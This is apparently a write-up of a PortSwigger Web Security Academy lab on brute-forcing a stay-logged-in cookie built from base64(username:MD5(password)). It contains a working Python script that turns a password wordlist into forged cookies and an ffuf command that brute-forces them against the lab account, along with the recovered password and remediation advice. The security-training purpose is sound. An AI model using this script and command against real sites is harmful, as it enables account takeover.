# Brute-forcing a stay-logged-in cookie - PortSwigger Lab 36

**Severity:** Medium
**Target:** https://0a1600940350f3b18099da2200490021.web-security-academy.net

## Summary
The stay-logged-in cookie is constructed using base64(username:MD5(password)), with no rate limiting or brute-force protection. 
MD5 is a broken hash algorithm, making it trivial to reverse via wordlist attack.


## Vulnerability Details
**Type:** brute-forcing a stay-logged-in cookie
**Root Cause:** Weak cookie construction using MD5 hashing with no brute-force protection on cookie-based authentication.
**Endpoint:**  https://0a1600940350f3b18099da2200490021.web-security-academy.net/my-account?id=carlos

## Steps to Reproduce
1. First, decode the stay-logged-in cookie of a known account (wiener:peter) to identify the structure: base64(username:MD5(password)).
2. Make a wordlist with the stay-logged-in cookie logic, use python for it.
3. Use ffuf to brute the stay-logged-in cookie with the wordlist cookiebase64md5.txt
4. After getting the output, use ctrl + f to look the position in cookiebase64md5.txt
5. with the position number like 18. look in the rockpass.txt which password matches 

## Proof of Concept

python wordlist 
```python
import hashlib
import base64
            
with open('/home/luweed/Documents/rockpass.txt') as f:
    senhas = f.read().splitlines()
    
with open('/home/luweed/Documents/cookiebase64md5.txt', 'w') as f:
    for senha in senhas:
        md5 = hashlib.md5(senha.encode()).hexdigest()
        cookie = base64.b64encode(f"carlos:{md5}".encode()).decode()
        f.write(cookie + '\n')
```

ffuf attackline

```bash
ffuf -w /home/luweed/Documents/cookiebase64md5.txt:FUZZ \
     -u https://0a1600940350f3b18099da2200490021.web-security-academy.net/my-account?id=carlos \
     -H "Cookie: stay-logged-in=FUZZ" \
     -mr "Update email"
```

## Result

In that specific lab it was

<img width="1008" height="258" alt="image" src="https://github.com/user-attachments/assets/195efeff-2259-4c83-aeb7-f965b3785f38" />
<br>

<img width="621" height="91" alt="image" src="https://github.com/user-attachments/assets/a98aacb8-19fb-42d8-9de8-aa79716d91f1" />

<br>
<img width="621" height="91" alt="image" src="https://github.com/user-attachments/assets/bf625f3c-b19d-4afa-b16e-69ebe0be0374" />
<br>
<img width="1917" height="1044" alt="image" src="https://github.com/user-attachments/assets/def0135a-d59d-480e-96e2-0951975d8647" />
<br>


``carlos:master``


## Impact

This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
Use a cryptographically secure random token as the stay-logged-in cookie instead of a predictable hash. Implement server-side rate limiting on cookie-based authentication attempts.
